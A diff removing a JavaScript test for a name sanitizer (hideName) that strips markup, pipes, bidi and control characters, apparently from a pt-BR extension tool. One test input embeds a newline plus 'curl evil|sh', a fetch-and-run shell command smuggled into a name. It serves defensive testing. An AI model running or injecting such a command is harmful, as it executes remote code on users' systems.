@@ -80,13 +80,3 @@ test('model: searchIcons ranks exact names first, accepts pt-BR words and tags',
   assert.equal(M.searchIcons(names, tags, '').length, 4);
 });
 
-test('hideName: letters, digits and basic punctuation survive (SEC-23); control, bidi, pipes and markup do not', () => {
-  assert.equal(M.hideName('GitLens — Git supercharged'), 'GitLens Git supercharged');
-  assert.equal(M.hideName('Código Fácil'), 'Código Fácil');
-  assert.equal(M.hideName('<b>X</b>'), 'b X b');
-  assert.equal(M.hideName('X\ncurl evil|sh\n'), 'X curl evil sh');
-  assert.equal(M.hideName('a‮b'), 'a b');
-  assert.equal(M.hideName('***'), 'a extensão');
-  assert.equal(M.hideName('x'.repeat(100)).length, 60);
-  assert.match(M.hideHint('Docker'), /ícone de Docker e escolha Ocultar\.$/);
-});
